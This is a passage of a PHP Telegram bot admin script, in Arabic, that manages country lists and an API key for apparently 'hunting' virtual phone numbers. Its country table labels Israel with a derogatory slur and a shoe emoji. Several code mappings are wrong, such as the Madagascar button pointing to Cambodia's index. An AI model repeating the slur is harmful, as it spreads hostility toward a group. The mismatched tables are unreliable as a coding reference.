<?php
require "data.php";
$update = json_decode(file_get_contents('php://input'));
if(isset($update->message) || isset($update->callback_query)):
$message = $update->message ;
$data=  $update->callback_query->data;
$id = $message->from->id ?? $update->callback_query->from->id;
$chat_id = $message->chat->id ?? $update->callback_query->message->chat->id;
$text = $message->text ;
$user = $message->from->username ?? $update->callback_query->from->username;
$name = $message->from->first_name ?? $update->callback_query->from->first_name;
$message_id = $message->message_id ?? $update->callback_query->message->message_id;
$type = $message->chat->type ?? $update->callback_query->message->chat->type;
$reply = $message->reply_to_message;
endif;
$link =  "https://".$_SERVER["SERVER_NAME"].$_SERVER["PHP_SELF"];
echo file_get_contents("https://api.telegram.org/bot$token/setWebHook?url=$link");
$ex = explode ("#",$data);

#countries
    $_co['country']['0'] = "روسيا 🇷🇺";
    $_co['country']['1'] = "أوكرانيا 🇺🇦";
    $_co['country']['2'] = "كازاخستان 🇰🇿";
    $_co['country']['3'] = "الصين 🇨🇳";
    $_co['country']['4'] = "الفلبين 🇵🇭";
    $_co['country']['5'] = "ميانمار 🇲🇲";
    $_co['country']['6'] = "إندونيسيا 🇮🇩";
    $_co['country']['7'] = "ماليزيا 🇲🇾";
    $_co['country']['8'] = "كينيا 🇰🇪";
    $_co['country']['9'] = "تنزانيا 🇹🇿";
    $_co['country']['10'] = "فيتنام 🇻🇳";
    $_co['country']['11'] = "قيرغيزستان 🇰🇬";
    $_co['country']['12'] = "بني صهيون 🇮🇱👞";
    $_co['country']['13'] = "هونغ كونغ 🇭🇰";
    $_co['country']['14'] = "بولندا 🇵🇱";
    $_co['country']['15'] = "🇬🇧 بريطانيا";
    $_co['country']['16'] = "مدغشقر 🇲🇬";
    $_co['country']['17'] = "نيجيريا 🇳🇬";
    $_co['country']['18'] = "ماكاو 🇲🇴";
    $_co['country']['19'] = "مصر 🇪🇬";
    $_co['country']['20'] = "الهند 🇮🇳";
    $_co['country']['21'] = "أيرلندا 🇮🇪";
    $_co['country']['22'] = "كمبوديا 🇰🇭";
    $_co['country']['23'] = "هايتي 🇭🇹";
    $_co['country']['24'] = "غامبيا 🇬🇲";
    $_co['country']['25'] = "صربيا 🇷🇸";
    $_co['country']['26'] = "اليمن 🇾🇪";
    $_co['country']['27'] = "جنوب إفريقيا 🇿🇦";
    $_co['country']['28'] = "رومانيا 🇷🇴";
    $_co['country']['29'] = "كولومبيا 🇨🇴";
    $_co['country']['30'] = "إستونيا 🇪🇪";
    $_co['country']['31'] = "أذربيجان 🇦🇿";
    $_co['country']['32'] = "كندا 🇨🇦";
    $_co['country']['33'] = "المغرب 🇲🇦";
    $_co['country']['34'] = "غانا 🇬🇭";
    $_co['country']['35'] = "الأرجنتين 🇦🇷";
    $_co['country']['36'] = "أوزبكستان 🇺🇿";
    $_co['country']['37'] = "الكاميرون 🇨🇲";
    $_co['country']['38'] = "تشاد 🇹🇩";
    $_co['country']['39'] = "المانيا 🇩🇪";
    $_co['country']['40'] = "ليتوانيا 🇱🇹";
    $_co['country']['41'] = "كرواتيا 🇭🇷";
    $_co['country']['42'] = "السويد 🇸🇪";
    $_co['country']['43'] = "العراق 🇮🇶";
    $_co['country']['44'] = "هولندا 🇳🇱";
    $_co['country']['45'] = "لاتيفيا 🇱🇻";
    $_co['country']['46'] = "النمسا 🇦🇹";
    $_co['country']['47'] = "بيلاروسيا 🇧🇾";
    $_co['country']['48'] = "تايلاند 🇹🇭";
    $_co['country']['49'] = "السعودية 🇸🇦";
    $_co['country']['50'] = "المكسيك 🇲🇽";
    $_co['country']['51'] = "تايوان 🇹🇼";
    $_co['country']['52'] = "اسبانيا 🇪🇸";
    $_co['country']['53'] = "إيران 🇮🇷";
    $_co['country']['54'] = "الجزائر 🇩🇿";
    $_co['country']['55'] = "سلوفينيا 🇸🇮";
    $_co['country']['56'] = "بنغلاديش 🇧🇩";
    $_co['country']['57'] = "السنغال 🇸🇳";
    $_co['country']['58'] = "تركيا 🇹🇷";
    $_co['country']['59'] = "التشيك 🇨🇿";
    $_co['country']['60'] = "سريلانكا 🇱🇰";
    $_co['country']['61'] = "بيرو 🇵🇪";
    $_co['country']['62'] = "باكستان 🇵🇰";
    $_co['country']['63'] = "نيوزيلندا 🇳🇿";
    $_co['country']['64'] = "غينيا 🇬🇳";
    $_co['country']['65'] = "مالي 🇲🇱";
    $_co['country']['66'] = "فنزويلا 🇻🇪";
    $_co['country']['67'] = "إثيوبيا 🇪🇹";
    $_co['country']['68'] = "منغوليا 🇲🇳";
    $_co['country']['69'] = "البرازيل 🇧🇷";
    $_co['country']['70'] = "أفغانستان 🇦🇫";
    $_co['country']['71'] = "أوغندا 🇺🇬";
    $_co['country']['72'] = "أنغولا 🇦🇴";
    $_co['country']['73'] = "قبرص 🇨🇾";
    $_co['country']['74'] = "فرنسا 🇫🇷";
    $_co['country']['75'] = "بابو 🇵🇬";
    $_co['country']['76'] = "موزمبيق 🇲🇿";
    $_co['country']['77'] = "نيبال 🇳🇵";
    $_co['country']['78'] = "بلجيكا 🇧🇪";
    $_co['country']['79'] = "بلغاريا 🇧🇬";
    $_co['country']['80'] = "مولدوفا 🇲🇩";
    $_co['country']['81'] = "إيطاليا 🇮🇹";
    $_co['country']['82'] = "باراغواي 🇵🇾";
    $_co['country']['83'] = "هندوراس 🇭🇳";
    $_co['country']['84'] = "تونس 🇹🇳";
    $_co['country']['85'] = "نيكاراغوا 🇳🇮";
    $_co['country']['86'] = "بوليفيا 🇧🇴";
    $_co['country']['87'] = "كوستاريكا 🇨🇷";
    $_co['country']['88'] = "غواتيمالا 🇬🇹";
    $_co['country']['89'] = "الإمارات 🇦🇪";
    $_co['country']['90'] = "زيمبابوي 🇿🇼";
    $_co['country']['91'] = "السودان 🇸🇩";
    $_co['country']['92'] = "الكويت 🇰🇼";
    $_co['country']['93'] = "سلفادور 🇸🇻";
    $_co['country']['94'] = "ليبيا 🇱🇾";
    $_co['country']['95'] = "جامايكا 🇯🇲";
    $_co['country']['96'] = "الاكوادور 🇪🇨";
    $_co['country']['97'] = "سوازيلاند 🇸🇿";
    $_co['country']['98'] = "عمان 🇴🇲";
    $_co['country']['99'] = "الدومينيكان 🇩🇴";
    $_co['country']['100'] = "سوريا 🇸🇾";
    $_co['country']['101'] = "قطر 🇶🇦";
    $_co['country']['102'] = "بنما 🇵🇦";
    $_co['country']['103'] = "كوبا 🇨🇺";
    $_co['country']['104'] = "موريتانيا 🇲🇷";
    $_co['country']['105'] = "سيراليون 🇸🇱";
    $_co['country']['106'] = "الأردن 🇯🇴";
    $_co['country']['107'] = "البرتغال 🇵🇹";
    $_co['country']['108'] = "بربادوس 🇧🇧";
    $_co['country']['109'] = "بوروندي 🇧🇮";
    $_co['country']['110'] = "بنين 🇧🇯";
    $_co['country']['111'] = "جزر البهاما 🇧🇸";
    $_co['country']['112'] = "بوتسوانا 🇧🇼";
    $_co['country']['113'] = "بليز 🇧🇿";
    $_co['country']['114'] = "إفريقيا الوسطى 🇨🇫";
    $_co['country']['115'] = "دومينيكا 🇩🇲";
    $_co['country']['116'] = "غرينادا 🇬🇩";
    $_co['country']['117'] = "جورجيا 🇬🇪";
    $_co['country']['118'] = "اليونان 🇬🇷";
    $_co['country']['119'] = "غينيا بيساو 🇬🇼";
    $_co['country']['120'] = "غيانا 🇬🇾";
    $_co['country']['121'] = "جزر القمر 🇰🇲";
    $_co['country']['122'] = "ليبيريا 🇱🇷";
    $_co['country']['123'] = "ليسوتو 🇱🇸";
    $_co['country']['124'] = "ملاوي 🇲🇼";
    $_co['country']['125'] = "ناميبيا 🇳🇦";
    $_co['country']['126'] = "النيجر 🇳🇪";
    $_co['country']['127'] = "رواندا 🇷🇼";
    $_co['country']['128'] = "سلوفاكيا 🇸🇰";
    $_co['country']['129'] = "سورينام 🇸🇷";
    $_co['country']['130'] = "طاجيكستان 🇹🇯";
    $_co['country']['131'] = "موناكو 🇲🇨";
    $_co['country']['132'] = "البحرين 🇧🇭";
    $_co['country']['133'] = "زامبيا 🇿🇲";
    $_co['country']['134'] = "أرمينيا 🇦🇲";
    $_co['country']['135'] = "الصومال 🇸🇴";
    $_co['country']['136'] = "الكونغو 🇨🇬";
    $_co['country']['137'] = "تشيلي 🇨🇱";
    $_co['country']['138'] = "لبنان 🇱🇧";
    $_co['country']['139'] = "ألبانيا 🇦🇱";
    $_co['country']['140'] = "اوروغواي 🇺🇾";
    $_co['country']['141'] = "بوتان 🇧🇹";
    $_co['country']['142'] = "المالديف 🇲🇻";
    $_co['country']['143'] = "جوادلوب 🇬🇵";
    $_co['country']['144'] = "تركمانستان 🇹🇲";
    $_co['country']['145'] = "فنلندا 🇫🇮";
    $_co['country']['146'] = "لوسيا 🇱🇨";
    $_co['country']['147'] = "لوكسمبورغ 🇱🇺";
    $_co['country']['148'] = "جزر غرينادين 🇻🇨";
    $_co['country']['149'] = "غينيا الأستوائية 🇬🇶";
    $_co['country']['150'] = "جيبوتي 🇩🇯";
    $_co['country']['151'] = "جزر كايمان 🇰🇾";
    $_co['country']['152'] = "الجبل الأسود 🇲🇪";
    $_co['country']['153'] = "سويسرا 🇨🇭";
    $_co['country']['154'] = "النرويج 🇳🇴";
    $_co['country']['155'] = "استراليا 🇦🇺";
    $_co['country']['156'] = "إريتريا 🇪🇷";
    $_co['country']['157'] = "جنوب السودان 🇸🇸";
    $_co['country']['158'] = "اروبا 🇦🇼";
    $_co['country']['159'] = "أنغيلا 🇦🇮";
    $_co['country']['160'] = "اليابان 🇯🇵";
    $_co['country']['161'] = "شمال مقدونيا 🇲🇰";
    $_co['country']['162'] = "سيشيل 🇸🇨";
    $_co['country']['163'] = "كاليدونيا 🇳🇨";
    $_co['country']['164'] = "أمريكا 🇺🇸";
    $_co['country']['165'] = "فيجي 🇫🇯";
    $_co['country']['166'] = "كوريا الجنوبية 🇰🇷";
    $_co['country']['167'] = "برمودا 🇧🇲";
    $_co['country']['168'] = "الصحراء الغربية 🇪🇭";
    $_co['country']['200'] = "العشوائي 🔥";
#
#countries2
    $_co_o['country']['0'] = "RU";
    $_co_o['country']['1'] = "UA";
    $_co_o['country']['2'] = "KZ";
    $_co_o['country']['3'] = "CN";
    $_co_o['country']['4'] = "PH";
    $_co_o['country']['5'] = "MM";
    $_co_o['country']['6'] = "ID";
    $_co_o['country']['7'] = "MY";
    $_co_o['country']['8'] = "KE";
    $_co_o['country']['9'] = "TZ";
    $_co_o['country']['10'] = "VN";
    $_co_o['country']['11'] = "KG";
    $_co_o['country']['12'] = "IL";
    $_co_o['country']['13'] = "HK";
    $_co_o['country']['14'] = "PL";
    $_co_o['country']['15'] = "GB";
    $_co_o['country']['16'] = "MG";
    $_co_o['country']['17'] = "NG";
    $_co_o['country']['18'] = "MO";
    $_co_o['country']['19'] = "EG";
    $_co_o['country']['20'] = "IN";
    $_co_o['country']['21'] = "IE";
    $_co_o['country']['22'] = "Cambodia";
    $_co_o['country']['23'] = "HT";
    $_co_o['country']['24'] = "GM";
    $_co_o['country']['25'] = "RS";
    $_co_o['country']['26'] = "YE";
    $_co_o['country']['27'] = "ZA";
    $_co_o['country']['28'] = "RO";
    $_co_o['country']['29'] = "CO";
    $_co_o['country']['30'] = "EE";
    $_co_o['country']['31'] = "AZ";
    $_co_o['country']['32'] = "CA";
    $_co_o['country']['33'] = "MA";
    $_co_o['country']['34'] = "GH";
    $_co_o['country']['35'] = "AR";
    $_co_o['country']['36'] = "UZ";
    $_co_o['country']['37'] = "CM";
    $_co_o['country']['38'] = "TD";
    $_co_o['country']['39'] = "DE";
    $_co_o['country']['40'] = "LT";
    $_co_o['country']['41'] = "HR";
    $_co_o['country']['42'] = "SE";
    $_co_o['country']['43'] = "IQ";
    $_co_o['country']['44'] = "NL";
    $_co_o['country']['45'] = "LV";
    $_co_o['country']['46'] = "AT";
    $_co_o['country']['47'] = "BY";
    $_co_o['country']['48'] = "TH";
    $_co_o['country']['49'] = "SaudiArabia";
    $_co_o['country']['50'] = "MX";
    $_co_o['country']['51'] = "TW";
    $_co_o['country']['52'] = "ES";
    $_co_o['country']['53'] = "IR";
    $_co_o['country']['54'] = "DZ";
    $_co_o['country']['55'] = "SI";
    $_co_o['country']['56'] = "BD";
    $_co_o['country']['57'] = "SN";
    $_co_o['country']['58'] = "TR";
    $_co_o['country']['59'] = "CZ";
    $_co_o['country']['60'] = "LK";
    $_co_o['country']['61'] = "PE";
    $_co_o['country']['62'] = "PK";
    $_co_o['country']['63'] = "NZ";
    $_co_o['country']['64'] = "GQ";
    $_co_o['country']['65'] = "ML";
    $_co_o['country']['66'] = "VE";
    $_co_o['country']['67'] = "ET";
    $_co_o['country']['68'] = "MN";
    $_co_o['country']['69'] = "BR";
    $_co_o['country']['70'] = "AF";
    $_co_o['country']['71'] = "UG";
    $_co_o['country']['72'] = "AO";
    $_co_o['country']['73'] = "CY";
    $_co_o['country']['74'] = "FR";
    $_co_o['country']['75'] = "PG";
    $_co_o['country']['76'] = "MZ";
    $_co_o['country']['77'] = "NP";
    $_co_o['country']['78'] = "BE";
    $_co_o['country']['79'] = "BG";
    $_co_o['country']['80'] = "MD";
    $_co_o['country']['81'] = "Italy";
    $_co_o['country']['82'] = "PY";
    $_co_o['country']['83'] = "HN";
    $_co_o['country']['84'] = "TN";
    $_co_o['country']['85'] = "NI";
    $_co_o['country']['86'] = "BO";
    $_co_o['country']['87'] = "CR";
    $_co_o['country']['88'] = "GT";
    $_co_o['country']['89'] = "AE";
    $_co_o['country']['90'] = "ZW";
    $_co_o['country']['91'] = "SD";
    $_co_o['country']['92'] = "KW";
    $_co_o['country']['93'] = "SV";
    $_co_o['country']['94'] = "LY";
    $_co_o['country']['95'] = "JM";
    $_co_o['country']['96'] = "EC";
    $_co_o['country']['97'] = "KW";
    $_co_o['country']['98'] = "OM";
    $_co_o['country']['99'] = "DO";
    $_co_o['country']['100'] = "SY";
    $_co_o['country']['101'] = "QA";
    $_co_o['country']['102'] = "PA";
    $_co_o['country']['103'] = "CU";
    $_co_o['country']['104'] = "MR";
    $_co_o['country']['105'] = "SL";
    $_co_o['country']['106'] = "JO";
    $_co_o['country']['107'] = "PT";
    $_co_o['country']['108'] = "BB";
    $_co_o['country']['109'] = "BI";
    $_co_o['country']['110'] = "BJ";
    $_co_o['country']['111'] = "BS";
    $_co_o['country']['112'] = "BW";
    $_co_o['country']['113'] = "BZ";
    $_co_o['country']['114'] = "CF";
    $_co_o['country']['115'] = "DM";
    $_co_o['country']['116'] = "GD";
    $_co_o['country']['117'] = "GE";
    $_co_o['country']['118'] = "GR";
    $_co_o['country']['119'] = "GW";
    $_co_o['country']['120'] = "GY";
    $_co_o['country']['121'] = "KM";
    $_co_o['country']['122'] = "LR";
    $_co_o['country']['123'] = "LS";
    $_co_o['country']['124'] = "MW";
    $_co_o['country']['125'] = "NA";
    $_co_o['country']['126'] = "NE";
    $_co_o['country']['127'] = "RW";
    $_co_o['country']['128'] = "SK";
    $_co_o['country']['129'] = "SR";
    $_co_o['country']['130'] = "TJ";
    $_co_o['country']['131'] = "MC";
    $_co_o['country']['132'] = "BH";
    $_co_o['country']['133'] = "ZM";
    $_co_o['country']['134'] = "AM";
    $_co_o['country']['135'] = "SO";
    $_co_o['country']['136'] = "CG";
    $_co_o['country']['137'] = "CL";
    $_co_o['country']['138'] = "LB";
    $_co_o['country']['139'] = "AL";
    $_co_o['country']['140'] = "UY";
    $_co_o['country']['141'] = "BT";
    $_co_o['country']['142'] = "MV";
    $_co_o['country']['143'] = "GP";
    $_co_o['country']['144'] = "TM";
    $_co_o['country']['145'] = "FI";
    $_co_o['country']['146'] = "LC";
    $_co_o['country']['147'] = "LU";
    $_co_o['country']['148'] = "VC";
    $_co_o['country']['149'] = "GQ";
    $_co_o['country']['150'] = "DJ";
    $_co_o['country']['151'] = "KY";
    $_co_o['country']['152'] = "ME";
    $_co_o['country']['153'] = "CH";
    $_co_o['country']['154'] = "NO";
    $_co_o['country']['155'] = "AU";
    $_co_o['country']['156'] = "ER";
    $_co_o['country']['157'] = "SS";
    $_co_o['country']['158'] = "AW";
    $_co_o['country']['159'] = "AI";
    $_co_o['country']['160'] = "JP";
    $_co_o['country']['161'] = "MK";
    $_co_o['country']['162'] = "SC";
    $_co_o['country']['163'] = "NC";
    $_co_o['country']['164'] = "US";
    $_co_o['country']['165'] = "FJ";
    $_co_o['country']['166'] = "KR";
    $_co_o['country']['167'] = "BM";
    $_co_o['country']['168'] = "EH";
    $_co_o['country']['200'] = " ";
#

$sumdo = array("1287088041","6090158249","","",""); //ايدي الادمن حق البوت

if(in_array($id, $sumdo)){

	
	if($text == "/start" or $data == "back") {
		$info["admin"] = "";
		save();
		if($data=="back")
		$bot->deletemessage ([
			"chat_id"=>$chat_id,
			"message_id"=>$message_id
		]);
		$bot->sendmessage ([
			"chat_id"=>$chat_id,
			"text"=>"❤️ | مرحبا بك مطوري 

☑️ | تحكم في البوت عبر الازرار بلاسفل ⬇️

\n/work لجعل البوت يبدا الصيد\n/stop لجعل البوت يتوقف عن الصيد",
			"reply_markup"=>json_encode([
				"inline_keyboard"=>[
          [["text"=>"| شراء رقم يدوي 🔁","callback_data"=>"numapp"]],
					[["text"=>"| حذف دولة ❌","callback_data"=>"del"],
					["text"=>"| أضافة دولة 🌍","callback_data"=>"add"]],
          [["text"=>"| حذف API 🗑","callback_data"=>"rem"],
					["text"=>"| رفع APl ✅","callback_data"=>"up"]],
					[["text"=>"| الدول المضافة ♻️","callback_data"=>"all"]],
				//	[['text'=>'• O𝖘𝖆𝖒𝖆A𝖗𝖍𝖆𝖗𝖉𝖎 -','url'=>'t.me/OOSAA77']],
				]
			])
		]);
		
	} 
  
  
  
  
  elseif($text == "/work") {
		$bot->sendmessage ([
			"chat_id"=>$chat_id,
			"text"=>trim($txt["| تشغيل الصيد 🔛"])
		]);
		$info["status"]="work";
		save();
	} 
  
  elseif ($text == "/stop") {
		$bot->sendmessage ([
			"chat_id"=>$chat_id,
			"text"=>trim($txt["| إيقاف الصيد 🛑"])
		]);
		$info["status"]=null;
		save();
	} 
  
  
  elseif ($data) {
		if($data == "all"){
      $all = "";
      foreach($info["countries"] as $cont=>$key){
       
        $name = $_co['country'][$cont];
        $all .= "   $name\n  ";
        
      }
      $all = $all ?: "لا توجد دول مُضافة ❤️";

        $bot->answercallbackquery([
			  	"callback_query_id" => $update->callback_query->id,
			  	"text"=>". $all",
			  	"show_alert"=>true,
		  	]);
      
		
			
		} 
    
    
    
  if ($data == "add") {
    $bot->editmessagetext([
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
اختر إحدى الدول التي تريد إضافتها ⏪
",
      'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>'الدول العربية','callback_data'=>"Arab"],['text'=>'الدول الأجنبية','callback_data'=>"foreign"]],
[['text'=>'السيرفر العشوائي 🔥','callback_data'=>"addgeet-200"]],
[['text'=>'🔁 | رجوع 🔚','callback_data'=>"back"]],
          ]
      ])
    ]);

			
		} 
  
  
  
  if ($data == "del") {
    if(count($info["countries"]) >= 1){
      $keyboard     = [];
      $keyboard['inline_keyboard'][] = [['text'=>'رمز الدولة','callback_data'=>'on'],['text'=>'الدولة','callback_data'=>'on']];
      foreach($info["countries"] as $cont=>$key){
        $name = $_co['country'][$cont];
        $keyboard['inline_keyboard'][] = [['text'=>"$key",'callback_data'=>"contdel-$cont-$key"],['text'=>"$name",'callback_data'=>"contdel-$cont-$key"]];
      }
      $keyboard['inline_keyboard'][] = [['text'=>'رجوع','callback_data'=>"back"]];
      $keyboad      = json_encode($keyboard);
      $bot->editmessagetext([
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
⚙ إضغط على الدولة الذي تريد حذفها من قائمة الصيد ⬇️
",
        'parse_mode'=>"MarkDown",
        'reply_markup'=>($keyboad),
      ]);
      exit;
    }
    else{
      $bot->answercallbackquery([
          'callback_query_id' => $update->callback_query->id,
          'text'=>'🚫 عذرا لم تقم ب إضافة أي دولة للصيد بعد',
          'show_alert'=>true
        ]);
      exit;

    }

  }


    if ($data == "up") {

      
			if($api_key == null) {
        
				$bot->editmessagetext([
					"chat_id"=>$chat_id,
					"text"=>"قم بارسال api key الخاص بحسابك",
					"message_id"=>$message_id,
					"reply_markup"=>json_encode([
						"inline_keyboard"=>[
							[["text"=>"رجوع🔙","callback_data"=>"back"]],
						]
					])
				]);
				$info["admin"] = "up";
				save();
        
			}
      
      
      else{
				$bot->answercallbackquery([
					"callback_query_id" => $update->callback_query->id,
					"text"=>"لايمكنك اضافة api key جديد إلى بعد حذف القديم",
					"show_alert"=>true,
				]);
			}


      
		}

    if ($data == "user") {

      
			
        
				$bot->editmessagetext([
					"chat_id"=>$chat_id,
					"text"=>"قم ب إدخال أسم المستخدم ",
					"message_id"=>$message_id,
					
				]);
				$info["admin"] = "user";
				save();
        
			
      
      
      

      
		}

    if ($data == "rem") {
			$bot->editmessagetext([
				"chat_id"=>$chat_id,
				"text"=>"تم الحذف بنجاح",
				"message_id"=>$message_id,
				"reply_markup"=>json_encode([
					"inline_keyboard"=>[
						[["text"=>"رجوع🔙","callback_data"=>"back"]],
					]
				])
			]);
			unset($info["keey"]);
			save();
		}
    if ($data == "hjk") {
			$bot->editmessagetext([
				"chat_id"=>$chat_id,
				"text"=>"تم الحذف بنجاح",
				"message_id"=>$message_id,
				"reply_markup"=>json_encode([
					"inline_keyboard"=>[
						[["text"=>"رجوع🔙","callback_data"=>"back"]],
					]
				])
			]);
			unset($info["useer"]);
			save();
			unset($info["paass"]);
			save();
		}

    

    if ($data == "foreign") {

			$bot->editmessagetext([
				"chat_id"=>$chat_id,
        "message_id"=>$message_id,
				"text"=>"
اختر إحدى الدول الأجنبية التي تريد اضافتها
لعرض باقي الدول أضغط على التالي ⏪
",	
				"reply_markup"=>json_encode([
					"inline_keyboard"=>[
            [['text'=>'الدول','callback_data'=>"no"],['text'=>'الدول','callback_data'=>"no"],['text'=>'الدول','callback_data'=>"no"]],
[['text'=>'مدغشقر 🇲🇬','callback_data'=>"addgeet-22"]],
[['text'=>'موزمبيق 🇲🇿','callback_data'=>"addgeet-76"],['text'=>'بابو 🇵🇬','callback_data'=>"addgeet-75"],['text'=>'إفريقيا الوسطى 🇨🇫','callback_data'=>"addgeet-114"]],
[['text'=>'بلجيكا 🇧🇪','callback_data'=>"addgeet-78"],['text'=>'نيبال 🇳🇵','callback_data'=>"addgeet-77"],['text'=>'ليسوتو 🇱🇸','callback_data'=>"addgeet-123"]],
[['text'=>'مولدوفا 🇲🇩','callback_data'=>"addgeet-80"],['text'=>'بلغاريا 🇧🇬','callback_data'=>"addgeet-79"],['text'=>'ناميبيا 🇳🇦','callback_data'=>"addgeet-125"]],
[['text'=>'باراغواي 🇵🇾','callback_data'=>"addgeet-82"],['text'=>'إيطاليا 🇮🇹','callback_data'=>"addgeet-81"],['text'=>'رواندا 🇷🇼','callback_data'=>"addgeet-127"]],
[['text'=>'غرينادا 🇬🇩','callback_data'=>"addgeet-116"],['text'=>'هندوراس 🇭🇳','callback_data'=>"addgeet-83"],['text'=>'سورينام 🇸🇷','callback_data'=>"addgeet-129"]],
[['text'=>'بوليفيا 🇧🇴','callback_data'=>"addgeet-86"],['text'=>'نيكاراغوا 🇳🇮','callback_data'=>"addgeet-85"],['text'=>'موناكو 🇲🇨','callback_data'=>"addgeet-131"]],
[['text'=>'غواتيمالا 🇬🇹','callback_data'=>"addgeet-88"],['text'=>'كوستاريكا 🇨🇷','callback_data'=>"addgeet-87"],['text'=>'زامبيا 🇿🇲','callback_data'=>"addgeet-133"]],
[['text'=>'زيمبابوي 🇿🇼','callback_data'=>"addgeet-90"],['text'=>'دومينيكا 🇩🇲','callback_data'=>"addgeet-115"],['text'=>'جوادلوب 🇬🇵','callback_data'=>"addgeet-143"]],
[['text'=>'اليونان 🇬🇷','callback_data'=>"addgeet-118"],['text'=>'جورجيا 🇬🇪','callback_data'=>"addgeet-117"],['text'=>'تشيلي 🇨🇱','callback_data'=>"addgeet-137"]],
[['text'=>'غيانا 🇬🇾','callback_data'=>"addgeet-120"],['text'=>'سلفادور 🇸🇻','callback_data'=>"addgeet-93"],['text'=>'ألبانيا 🇦🇱','callback_data'=>"addgeet-139"]],
[['text'=>'الاكوادور 🇪🇨','callback_data'=>"addgeet-96"],['text'=>'جامايكا 🇯🇲','callback_data'=>"addgeet-95"],['text'=>'بوتان 🇧🇹','callback_data'=>"addgeet-141"]],
[['text'=>'غينيا بيساو 🇬🇼','callback_data'=>"addgeet-119"],['text'=>'سوازيلاند 🇸🇿','callback_data'=>"addgeet-97"],['text'=>'فنلندا 🇫🇮','callback_data'=>"addgeet-145"]],
[['text'=>'ليبيريا 🇱🇷','callback_data'=>"addgeet-122"],['text'=>'الدومينيكان 🇩🇴','callback_data'=>"addgeet-99"],['text'=>'لوكسمبورغ 🇱🇺','callback_data'=>"addgeet-147"]],
[['text'=>'بنما 🇵🇦','callback_data'=>"addgeet-102"],['text'=>'جزر القمر 🇰🇲','callback_data'=>"addgeet-121"],['text'=>'غينيا الأستوائية 🇬🇶','callback_data'=>"addgeet-149"]],
[['text'=>'موريتانيا 🇲🇷','callback_data'=>"addgeet-104"],['text'=>'كوبا 🇨🇺','callback_data'=>"addgeet-103"],['text'=>'جزر كايمان 🇰🇾','callback_data'=>"addgeet-151"]],
[['text'=>'النرويج 🇳🇴','callback_data'=>"addgeet-154"],['text'=>'سويسرا 🇨🇭','callback_data'=>"addgeet-153"],['text'=>'ملاوي 🇲🇼','callback_data'=>"addgeet-124"]],
[['text'=>'إريتريا 🇪🇷','callback_data'=>"addgeet-156"],['text'=>'استراليا 🇦🇺','callback_data'=>"addgeet-155"],['text'=>'النيجر 🇳🇪','callback_data'=>"addgeet-126"]],
[['text'=>'اروبا 🇦🇼','callback_data'=>"addgeet-158"],['text'=>'الجبل الأسود 🇲🇪','callback_data'=>"addgeet-152"],['text'=>'سلوفاكيا 🇸🇰','callback_data'=>"addgeet-128"]],
[['text'=>'اليابان 🇯🇵','callback_data'=>"addgeet-160"],['text'=>'أنغيلا 🇦🇮','callback_data'=>"addgeet-159"],['text'=>'طاجيكستان 🇹🇯','callback_data'=>"addgeet-130"]],
[['text'=>'سيشيل 🇸🇨','callback_data'=>"addgeet-162"],['text'=>'شمال مقدونيا 🇲🇰','callback_data'=>"addgeet-161"],['text'=>'البحرين 🇧🇭','callback_data'=>"addgeet-132"]],
[['text'=>'أمريكا 🇺🇸','callback_data'=>"addgeet-164"],['text'=>'كاليدونيا 🇳🇨','callback_data'=>"addgeet-163"],['text'=>'أرمينيا 🇦🇲','callback_data'=>"addgeet-134"]],
[['text'=>'ملاوي 🇲🇼','callback_data'=>"addgeet-124"],['text'=>'سيراليون 🇸🇱','callback_data'=>"addgeet-105"],['text'=>'البرتغال 🇵🇹','callback_data'=>"addgeet-107"]],
[['text'=>'بربادوس 🇧🇧','callback_data'=>"addgeet-108"],['text'=>'بنين 🇧🇯','callback_data'=>"addgeet-110"],['text'=>'بوروندي 🇧🇮','callback_data'=>"addgeet-109"]],
[['text'=>'اوروغواي 🇺🇾','callback_data'=>"addgeet-140"],['text'=>'المالديف 🇲🇻','callback_data'=>"addgeet-142"],['text'=>'تركمانستان 🇹🇲','callback_data'=>"addgeet-144"]],
[['text'=>'لوسيا 🇱🇨','callback_data'=>"addgeet-146"],['text'=>'جزر غرينادين 🇻🇨','callback_data'=>"addgeet-148"],['text'=>'جيبوتي 🇩🇯','callback_data'=>"addgeet-150"]],
[['text'=>'كوريا الجنوبية 🇰🇷','callback_data'=>"addgeet-166"],['text'=>'فيجي 🇫🇯','callback_data'=>"addgeet-165"],['text'=>'الكونغو 🇨🇬','callback_data'=>"addgeet-136"]],
[['text'=>'الصحراء الغربية 🇪🇭','callback_data'=>"addgeet-168"],['text'=>'برمودا 🇧🇲','callback_data'=>"addgeet-167"],['text'=>'لبنان 🇱🇧','callback_data'=>"addgeet-138"]],
[['text'=>'بوتسوانا 🇧🇼','callback_data'=>"addgeet-112"],['text'=>'جزر البهاما 🇧🇸','callback_data'=>"addgeet-111"],['text'=>'بليز 🇧🇿','callback_data'=>"addgeet-113"]],

                                    
						[["text"=>"رجوع🔙","callback_data"=>"add"],["text"=>"رجوع للبداية🔙","callback_data"=>"back"]],
                           
					]
				])
			]);
		}

			


    if ($data == "Arab") {

			$bot->editmessagetext([
				"chat_id"=>$chat_id,
        "message_id"=>$message_id,
				"text"=>"
اختر إحدى الدول العربية التي تريد اضافتها
لعرض باقي الدول أضغط على التالي ⏪
",	
				"reply_markup"=>json_encode([
					"inline_keyboard"=>[
            [['text'=>'الدول','callback_data'=>"on"],['text'=>'الدول','callback_data'=>"on"],['text'=>'الدول','callback_data'=>"on"]],
            [['text'=>'اليمن 🇾🇪','callback_data'=>"addget-26"],['text'=>'مصر 🇪🇬','callback_data'=>"addget-19"],['text'=>'المغرب 🇲🇦','callback_data'=>"addget-33"]],
            [['text'=>'الجزائر 🇩🇿','callback_data'=>"addget-54"],['text'=>'السعودية 🇸🇦','callback_data'=>"addget-49"],['text'=>'العراق 🇮🇶','callback_data'=>"addget-43"]],
            [['text'=>'إيران 🇮🇷','callback_data'=>"addget-53"],['text'=>'تونس 🇹🇳','callback_data'=>"addget-84"],['text'=>'الإمارات 🇦🇪','callback_data'=>"addget-89"]],
            [['text'=>'الكويت 🇰🇼','callback_data'=>"addget-92"],['text'=>'السودان 🇸🇩','callback_data'=>"addget-91"],['text'=>'ليبيا 🇱🇾','callback_data'=>"addget-94"]],
            [['text'=>'عمان 🇴🇲','callback_data'=>"addget-98"],['text'=>'سوريا 🇸🇾','callback_data'=>"addget-100"],['text'=>'قطر 🇶🇦','callback_data'=>"addget-101"]],
